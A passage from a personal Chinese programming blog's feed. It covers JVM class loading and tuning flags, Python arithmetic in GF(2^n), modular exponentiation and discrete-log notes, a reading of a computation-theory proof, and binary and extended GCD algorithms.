class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> ClassLoader myLoader = <span class="keyword">new</span> ClassLoader() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String fileName = name.substring(name.lastIndexOf(<span class="string">"."</span>) + <span class="number">1</span>) + <span class="string">".class"</span>;</span><br><span class="line">            InputStream is = getClass().getResourceAsStream(fileName);</span><br><span class="line">            <span class="keyword">if</span> (is == <span class="keyword">null</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">"use super loader"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">super</span>.loadClass(name);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[is.available()];</span><br><span class="line">            is.read(b);</span><br><span class="line">            <span class="keyword">return</span> defineClass(name, b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException(name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><blockquote><p>以下可能有HotSpot专有的参数</p></blockquote><ul><li><p><code>-Xms</code>： the initial memory sizes available to the JVM</p></li><li><p><code>-Xmx</code>： the maximum memory sizes available to the JVM</p></li><li><p><code>-Xms</code>, <code>-Xmx</code>：用于JVM heap。Increasing the amount of memory available can improve performance, but increasing it to too high a value can have a detrimental effect in the form of longer pauses for full garbage collection runs. Therefore, the initial and maximum sizes should be set to the same value.</p></li><li><p><code>-Xmn</code>：新生代大小</p></li><li><p><code>-XX:SurvivorRatio</code>：Eden与Survivor区的比例</p></li><li><p><code>-XX:PretenureSizeThreshold</code>：晋升老年代对象的年龄</p></li><li><p><code>-Xss</code>：栈容量</p></li><li><p><code>-Xoss</code>：本地方法栈大小（因为HotSpot不区分虚拟机栈和本地方法栈，所以该参数无效）</p></li><li><p><code>-XX:MaxDirectMemorySize</code>：本地直接内存的最大容量。默认与java堆最大值一样</p></li><li><p><code>-Xnoclassgc</code>：是否对类进行回收（HotSpot VM）</p></li><li><p><code>-verbose:class</code>, <code>-XX:+TraceClassLoading</code>, <code>-XX:+TraceClassUnLoading</code>：查看类加载卸载信息。第三个需要FastDebug版虚拟机支持</p></li><li><p><code>-XX:+/-UseTLAB</code>：是否启用本地线程分配缓存</p></li><li><p><code>Xlog:gc*</code>, <code>-XX:+PrintGCDetails</code>：打印GC日志</p></li><li><p><code>-XX:MaxTenuringThreshold</code>：晋升老年代的年龄阀值</p></li><li><p><code>-XX:+PrintReferenceGC</code>：GC时打印finalReference的信息</p></li><li><p><code>-XX:+PrintGCApplicationStoppedTime</code>：打印到达安全点的信息</p></li><li><p><code>-XX:UseCompressedOops</code>：开启压缩指针</p></li><li><p><code>-XX:PretenureSizeThreshold</code>：大于这个设置值的对象直接在老年代分配。这样做的目的是避免在Eden区及两个Survivor区之间发生大量的内存复制（因为新生代采用复制算法收集内存）</p><blockquote><p>PretenureSizeThreshold参数只对Serial和ParNew两款收集器有效， Parallel Scavenge收集器不认识这个参数， Parallel Scavenge收集器一般并不需要设置。 如果遇到必须使用此参数的场合，可以考虑ParNew加CMS的收集器组合。</p></blockquote></li></ul><h3 id="实验和调优"><a href="#实验和调优" class="headerlink" title="实验和调优"></a>实验和调优</h3><h5 id="本地方法栈"><a href="#本地方法栈" class="headerlink" title="本地方法栈"></a>本地方法栈</h5><ul><li>HotSpot，单线程下怎样测试都只抛出<code>StackOverflowError</code>，所以<code>StackOverflowError</code>应该不是因为调用深度超过某个值就抛出，而是内存不足导致抛出（所以相应减小栈上变量的总大小，可以提高栈深度）</li><li>如果是建立过多线程导致的内存溢出，在不能减少线程数或者更换64位虚拟机的情况下， 就只能通过减少最大堆和减少栈容量来换取更多的线程</li></ul><h5 id="GC-1"><a href="#GC-1" class="headerlink" title="GC"></a>GC</h5><ul><li>大对象对GC不友好，经常出现大对象容易导致内存还有不少空间时就提前触发垃圾收集以获取足够的连续空间来“安置”它们。写程序时应当避免“短命大对象”。</li></ul><h5 id="局部变量表的slot复用与GC"><a href="#局部变量表的slot复用与GC" class="headerlink" title="局部变量表的slot复用与GC"></a>局部变量表的slot复用与GC</h5><ul><li><p>代码1</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] placeHolder = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span> * <span class="number">1024</span> * <span class="number">64</span>];</span><br><span class="line">        System.gc();</span><br><span class="line">        <span class="comment">// gc后，placeHolder没有被gc掉</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>代码2</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] placeHolder = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span> * <span class="number">1024</span> * <span class="number">64</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        System.gc();</span><br><span class="line">        <span class="comment">// gc后，placeHolder没有被gc掉</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>代码3</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] placeHolder = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span> * <span class="number">1024</span> * <span class="number">64</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line">        System.gc();</span><br><span class="line">        <span class="comment">// gc后，placeHolder被gc掉</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><blockquote><p>如果遇到一个方法，其后面的代码有一些耗时很长的操作，而前面又定义了占用了大量内存、实际上已经不会再使用的变量，手动将其设置为null值（用来代替那句<code>int a=0</code>，把变量对应的局部变量表Slot清空）便不见得是一个绝对无意义的操作，这种操作可以作为一种在极特殊情形（对象占用内存大、此方法的栈帧长时间不能被回收、方法调用次数达不到JIT的编译条件）下的“奇技”来使用。</p></blockquote></li><li><blockquote><p>从编码角度讲， 以恰当的变量作用域来控制变量回收时间才是最优雅的解决方法， 如代码清单8-3那样的场景并不多见。 更关键的是， 从执行角度讲， 使用赋null值的操作来优化内存回收是建立在对字节码执行引擎概念模型的理解之上的，但是实际执行中，与概念模型差别很大，所以赋null可能无必要（然而我自己使用java11，上面那个测试代码，G1，似乎没有<code>int a=0</code>就没有回收）</p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;本笔记大部分是《深入理解java虚拟机第二版》的笔记，该书基于java1.7&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;Override&quot;&gt;&lt;a href=&quot;#Override&quot; class=&quot;headerlink&quot; title=&quot;Ove
      
    
    </summary>
    
      <category term="JAVA" scheme="https://h-zex.github.io/categories/JAVA/"/>
    
      <category term="JVM" scheme="https://h-zex.github.io/categories/JAVA/JVM/"/>
    
    
  </entry>
  
  <entry>
    <title>$GF(2^n)$上算术运算的实现</title>
    <link href="https://h-zex.github.io/2018/10/18/GF-2-n%E4%B8%8A%E7%AE%97%E6%9C%AF%E8%BF%90%E7%AE%97%E7%9A%84%E5%AE%9E%E7%8E%B0/"/>
    <id>https://h-zex.github.io/2018/10/18/GF-2-n上算术运算的实现/</id>
    <published>2018-10-18T12:06:10.000Z</published>
    <updated>2019-07-02T15:43:52.393Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p><a href="https://github.com/H-ZeX/Cryptorgraphy-Course/blob/master/CryptographyLib/GF2nElement.py" target="_blank" rel="noopener">代码</a></p></li><li><p>几个关键点</p><ul><li><p>求模时，算法如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__modAndDiv__</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    return the (x%y, x/y)</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> y == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ZeroDivisionError</span><br><span class="line">    xl = util.bitLen(x)</span><br><span class="line">    yl = util.bitLen(y)</span><br><span class="line">    <span class="keyword">if</span> xl &lt; yl:</span><br><span class="line">        <span class="keyword">return</span> x, <span class="number">0</span></span><br><span class="line">    d = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> xl &gt;= yl:</span><br><span class="line">        x, d = Polynomial.__sub__(x, y &lt;&lt; (xl - yl)), Polynomial.__add__(d, (<span class="number">1</span> &lt;&lt; (xl - yl)))</span><br><span class="line">        xl = util.bitLen(x)</span><br><span class="line">    <span class="keyword">return</span> x, d</span><br></pre></td></tr></table></figure><p>要注意，不可以直接<code>__sub__(x, y)</code>，要<code>__sub__(x, y&lt;&lt;(xl-yl))</code>，保证<code>y&lt;&lt;(xl-yl)</code>的最高位与x的最高位是同一位，这样才能把x变小。如果直接减，因为<code>x^y^y=x</code>，也就是减去两次<code>y</code>等于没有减，从而死循环</p></li><li><p>计算乘法逆元时，可以使用extend gcd，也可以使用拉格朗日定理$a^{|s|}=e$（e是群S上的单位元），从而$a^{|s|-1}=a^{-1}$——因为每个元素都只有唯一逆元</p></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      在$GF(2^n)$域上的算术运算的python代码实现
    
    </summary>
    
      <category term="数学" scheme="https://h-zex.github.io/categories/%E6%95%B0%E5%AD%A6/"/>
    
      <category term="密码学" scheme="https://h-zex.github.io/categories/%E6%95%B0%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
      <category term="GF2n" scheme="https://h-zex.github.io/tags/GF2n/"/>
    
  </entry>
  
  <entry>
    <title>$x^y=z(mod\ n) 的所有相关问题的解法$</title>
    <link href="https://h-zex.github.io/2018/10/18/y-z-mod-n-%E7%9A%84%E6%89%80%E6%9C%89%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98%E7%9A%84%E8%A7%A3%E6%B3%95/"/>
    <id>https://h-zex.github.io/2018/10/18/y-z-mod-n-的所有相关问题的解法/</id>
    <published>2018-10-18T10:45:58.000Z</published>
    <updated>2019-07-02T15:43:52.377Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>以下$x$为未知数。所有数都是整数</p></blockquote><h2 id="a-x-b-mod-n"><a href="#a-x-b-mod-n" class="headerlink" title="$a^x=b(mod\ n)$"></a>$a^x=b(mod\ n)$</h2><ul><li>这是离散对数问题，是一个难的问题——Diffie-Hellman算法就依赖于该问题的难解性。</li></ul><h4 id="当-gcd-a-n-n-时"><a href="#当-gcd-a-n-n-时" class="headerlink" title="当$gcd(a, n)=n$时"></a>当$gcd(a, n)=n$时</h4><ul><li>如果$b=1$，则$x=0$，如果$b=0$，则x为任意正数</li></ul><h4 id="当-gcd-a-n-1-时"><a href="#当-gcd-a-n-1-时" class="headerlink" title="当$gcd(a,n)=1$时"></a>当$gcd(a,n)=1$时</h4><ul><li>使用baby-step giant-step算法，具体可以参考<a href="http://www.narutoacm.com/archives/solve-discrete-log/" target="_blank" rel="noopener">求解a^x=b(mod m)</a></li></ul><h2 id="x-a-b-mod-n"><a href="#x-a-b-mod-n" class="headerlink" title="$x^a=b(mod\ n)$"></a>$x^a=b(mod\ n)$</h2><ul><li>这也是一个难的问题，目前并没有高效的通解，RSA算法就依赖于$n=pq$（p、q为质数）时x的难解性</li></ul><h4 id="n-为质数时"><a href="#n-为质数时" class="headerlink" title="$n$为质数时"></a>$n$为质数时</h4><ul><li>根据费尔马小定理有$x^{n-1}=1(mod\ n)$</li><li>求解a在模$n-1$下的乘法逆元$b$，$x^{ab}=x^{1+k(n-1)}=x(mod\ n)$</li></ul><h4 id="n-为合数时"><a href="#n-为合数时" class="headerlink" title="$n$为合数时"></a>$n$为合数时</h4><ul><li>目前是没有<strong>通用</strong>的高效解的——不仅仅在$n=pq$（p、q为质数）时没有，而是$n$为任意合数时都没有</li><li>可以构造如下规约，使得如果$n$为多个（大于2个）质数的积时有高效解，那么RSA就被攻破。假设$y^e=c(mod\ pq)$，即$y^e+kpq=c$，然后假设有一个算法，对于$n=rst$（r、s、t为任意质数）时有高效算法$T$，那么，我们两边乘以$t^e$得到 $y^e\times t^e +kpqt^e=(yt)^e+kpqt^e=ct^e$，模上$pqt$，得到$(yt)^e=ct^e(mod\ pqt)$，让算法$T$求解出$yt$，从而，我们得到了$y=yt\times t^{-1}(mod\ pqt)$</li></ul><h2 id="a-b-x-mod-n"><a href="#a-b-x-mod-n" class="headerlink" title="$a^b=x(mod\ n)$"></a>$a^b=x(mod\ n)$</h2><ul><li><p>快速模幂，算法如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fastModulePow</span><span class="params">(x, y, n)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    :return: x**y mod n</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> y == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> % n</span><br><span class="line">    ans, x = <span class="number">1</span> % n, x % n</span><br><span class="line">    <span class="keyword">while</span> y != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> (y &amp; <span class="number">1</span>) == <span class="number">1</span>:</span><br><span class="line">            ans = x * ans % n</span><br><span class="line">        x, y = x * x % n, y // <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;以下$x$为未知数。所有数都是整数&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;a-x-b-mod-n&quot;&gt;&lt;a href=&quot;#a-x-b-mod-n&quot; class=&quot;headerlink&quot; title=&quot;$a^x=b(mod\ n)$&quot;&gt;&lt;
      
    
    </summary>
    
      <category term="数学" scheme="https://h-zex.github.io/categories/%E6%95%B0%E5%AD%A6/"/>
    
      <category term="密码学" scheme="https://h-zex.github.io/categories/%E6%95%B0%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
      <category term="离散对数" scheme="https://h-zex.github.io/tags/%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0/"/>
    
      <category term="快速幂" scheme="https://h-zex.github.io/tags/%E5%BF%AB%E9%80%9F%E5%B9%82/"/>
    
      <category term="RSA" scheme="https://h-zex.github.io/tags/RSA/"/>
    
  </entry>
  
  <entry>
    <title>对Introduction to the Theory of Computation 3rd Theorem 9.20 的一些理解</title>
    <link href="https://h-zex.github.io/2018/09/29/%E5%AF%B9ITOC-3rd-Theorem-9-20-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/"/>
    <id>https://h-zex.github.io/2018/09/29/对ITOC-3rd-Theorem-9-20-的一些理解/</id>
    <published>2018-09-29T06:45:15.000Z</published>
    <updated>2019-07-02T15:43:52.325Z</updated>
    
    <content type="html"><![CDATA[<ul><li><img src="/2018/09/29/对ITOC-3rd-Theorem-9-20-的一些理解/1.png"></li><li>证明中，通过枚举所有的P时间内运行的图灵机，然后利用对角化方法，来构造集合$A$，使得对于某一个$M_i$和某一个选定的$n$，要么$M_i$识别$1^n$，但是$A$不包含长度为n的字符串，要么$M_i$不识别$1^n$，但是$A$包含某一个长度为n的字符串。并且，为了使得$M_i$与$n$可以一一对应，要求所选取的$n$单调增长</li><li>按照文中描述的方法，构造似乎可以成立。但是，有一个重要的地方作者没有提及——<strong>无论集合$A$是否构造好，</strong>我们都应该可以运行任意一台$M_i$，$M_i$行为要保持一致</li><li>在我们运行$M_i$来构造集合$A$ 的过程中，每次$M_i$查询orcale，orcale都会因为长度为$n$ 的字符串尚未被决定是否加进去集合$A$而回答NO，不过，如果我们决定长度为$n$的字符串是否加进去集合$A$中后，orcale会如实回答。那么，在长度为n的字符串被决定是否加进去集合$A$之前和之后，orcale对某些字符串的回答不一致是否会导致$M_i$ 的行为改变，从而本来$M_i$不识别$1^n$，现在却识别了$1^n$，或者相反</li><li>可以证明，无论$A$是否构造好，$M_i$的行为还是会保持一致</li><li>一开始，长度为$n$的字符串还没有加进去时，orcale都是回答NO，所以：<ul><li>如果$M_i$不识别$1^n$，我们就给$A$加进去一个$M_i$没有询问到长度为n的字符串，从而，虽然集合$A$现在有了长度为$n$的字符串，但是，对于输入$1^n$，$M_i$对orcale的询问的答案依然全部是NO——因为输入确定，$M_i$确定，所以$M_i$究竟会询问orcale哪些字符串也是确定的——只要我们保证对询问的回答是一致的</li><li>如果$M_i$识别$1^n$，那么我们根本就不会给集合$A$加进去长度为$n$的字符串，那么，对于输入$1^n$，orcale对$M_i$的询问的结果依然全部是NO</li></ul></li><li>这个证明要成立还有一个很重要的地方，图灵机是可数个的，因为对于每一台$M_i$，我们都使用独特的$n$，那么，如果图灵机有不可数个，这个一一对应关系就无法建立。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ul&gt;
&lt;li&gt;&lt;img src=&quot;/2018/09/29/对ITOC-3rd-Theorem-9-20-的一些理解/1.png&quot;&gt;&lt;/li&gt;
&lt;li&gt;证明中，通过枚举所有的P时间内运行的图灵机，然后利用对角化方法，来构造集合$A$，使得对于某一个$M_i$和某一个选定的$n$
      
    
    </summary>
    
      <category term="计算理论" scheme="https://h-zex.github.io/categories/%E8%AE%A1%E7%AE%97%E7%90%86%E8%AE%BA/"/>
    
    
      <category term="图灵机" scheme="https://h-zex.github.io/tags/%E5%9B%BE%E7%81%B5%E6%9C%BA/"/>
    
      <category term="P与NP" scheme="https://h-zex.github.io/tags/P%E4%B8%8ENP/"/>
    
      <category term="对角化" scheme="https://h-zex.github.io/tags/%E5%AF%B9%E8%A7%92%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Binary GCD And Extend Binary GCD</title>
    <link href="https://h-zex.github.io/2018/09/17/Binary-GCD-And-Extend-Binary-GCD/"/>
    <id>https://h-zex.github.io/2018/09/17/Binary-GCD-And-Extend-Binary-GCD/</id>
    <published>2018-09-17T13:58:41.000Z</published>
    <updated>2019-07-02T15:43:52.273Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Binary-GCD"><a href="#Binary-GCD" class="headerlink" title="Binary GCD"></a>Binary GCD</h2><ul><li><p>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binaryGCD</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    x, y = abs(x), abs(y)</span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">0</span> <span class="keyword">or</span> y == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> x + y</span><br><span class="line">    <span class="keyword">if</span> x == y:</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    <span class="comment"># this cycle is O(N^2)(assume that N = max(lgx, lgy))</span></span><br><span class="line">    <span class="keyword">while</span> ((x &amp; <span class="number">1</span>) | (y &amp; <span class="number">1</span>)) == <span class="number">0</span>:</span><br><span class="line">        cnt += <span class="number">1</span></span><br><span class="line">        x = x &gt;&gt; <span class="number">1</span></span><br><span class="line">        y = y &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="comment"># the y below is surely odd</span></span><br><span class="line">    <span class="comment"># when x-y, x and y are odd, so x will become even</span></span><br><span class="line">    <span class="comment"># so the x&gt;&gt;1 will be run every cycles</span></span><br><span class="line">    <span class="comment"># so this cycle is O(N^2)</span></span><br><span class="line">    <span class="keyword">while</span> x != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">while</span> (x &amp; <span class="number">1</span>) == <span class="number">0</span>:</span><br><span class="line">            x = x &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> y &gt; x:</span><br><span class="line">            x, y = y, x</span><br><span class="line">        x, y = x - y, y</span><br><span class="line">    <span class="keyword">return</span> y * (<span class="number">1</span> &lt;&lt; cnt)</span><br></pre></td></tr></table></figure></li><li><p>复杂度分析：设$n=max(bitlen(x), bitlen(y))$。17行开始的循环中，因为<code>y</code>必然为奇数，所以<code>x-y</code>为偶数，所以第18行的循环在每次外层循环运行一次时都至少运行一次，所以有$O(n)$次循环，每次循环需要$O(n)$的均摊复杂度——因为第18行的每次都是$O(n)$的复杂度，然后整个算法中这种移位最多有$O(n)$次，所以，整个算法复杂度为$O(n^2)$</p></li><li><p>trivial 版本的GCD如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GCD</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> y != <span class="number">0</span>:</span><br><span class="line">        x, y = y, x % y</span><br><span class="line">    <span class="keyword">return</span> x</span><br></pre></td></tr></table></figure><p>需要$O(n^3)$的复杂度</p></li></ul><h2 id="Extend-Binary-GCD"><a href="#Extend-Binary-GCD" class="headerlink" title="Extend Binary GCD"></a>Extend Binary GCD</h2><ul><li><p>代码，<a href="http://www.ucl.ac.uk/~ucahcjm/combopt/ext_gcd_python_programs.pdf" target="_blank" rel="noopener">引用自</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extendBinaryGCD</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="string">"""Extended binary GCD.</span></span><br><span class="line"><span class="string">    Given input a, b the function returns s, t, d</span></span><br><span class="line"><span class="string">    such that gcd(a,b) = d = as + bt."""</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">1</span>, b</span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    <span class="keyword">if</span> a == b:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    u, v, s, t, r = <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> (a % <span class="number">2</span> == <span class="number">0</span>) <span class="keyword">and</span> (b % <span class="number">2</span> == <span class="number">0</span>):</span><br><span class="line">        a, b, r = a // <span class="number">2</span>, b // <span class="number">2</span>, r + <span class="number">1</span></span><br><span class="line">    alpha, beta = a, b</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># from here on we maintain a = u * alpha + v * beta</span></span><br><span class="line">    <span class="comment"># and b = s * alpha + t * beta</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="keyword">while</span> a % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># v is always even</span></span><br><span class="line">        a = a // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> (u % <span class="number">2</span> == <span class="number">0</span>) <span class="keyword">and</span> (v % <span class="number">2</span> == <span class="number">0</span>):</span><br><span class="line">            u, v = u // <span class="number">2</span>, v // <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            u, v = (u + beta) // <span class="number">2</span>, (v - alpha) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> a != b:</span><br><span class="line">        <span class="keyword">if</span> b % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            b = b // <span class="number">2</span></span><br><span class="line">            <span class="comment">#</span></span><br><span class="line">            <span class="comment"># Commentary: note that here, since b is even,</span></span><br><span class="line">            <span class="comment"># (i) if s, t are both odd then so are alpha, beta</span></span><br><span class="line">            <span class="comment"># (ii) if s is odd and t even then alpha must be even, so beta is odd</span></span><br><span class="line">            <span class="comment"># (iii) if t is odd and s even then beta must be even, so alpha is odd</span></span><br><span class="line">            <span class="comment"># so for each of (i), (ii) and (iii) s + beta and t - alpha are even</span></span><br><span class="line">            <span class="comment">#</span></span><br><span class="line">            <span class="keyword">if</span> (s % <span class="number">2</span> == <span class="number">0</span>) <span class="keyword">and</span> (t % <span class="number">2</span> == <span class="number">0</span>):</span><br><span class="line">                s, t = s // <span class="number">2</span>, t // <span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                s, t = (s + beta) // <span class="number">2</span>, (t - alpha) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">elif</span> b &lt; a:</span><br><span class="line">            a, b, u, v, s, t = b, a, s, t, u, v</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            b, s, t = b - a, s - u, t - v</span><br><span class="line">    <span class="keyword">return</span> s, t, (<span class="number">2</span> ** r) * a</span><br></pre></td></tr></table></figure></li><li><p>思路：从19行开始，维护式子b=s*alpha+t*beta 的成立——可以验证，每次s、t更改后，式子还是成立</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Binary-GCD&quot;&gt;&lt;a href=&quot;#Binary-GCD&quot; class=&quot;headerlink&quot; title=&quot;Binary GCD&quot;&gt;&lt;/a&gt;Binary GCD&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;代码&lt;/p&gt;
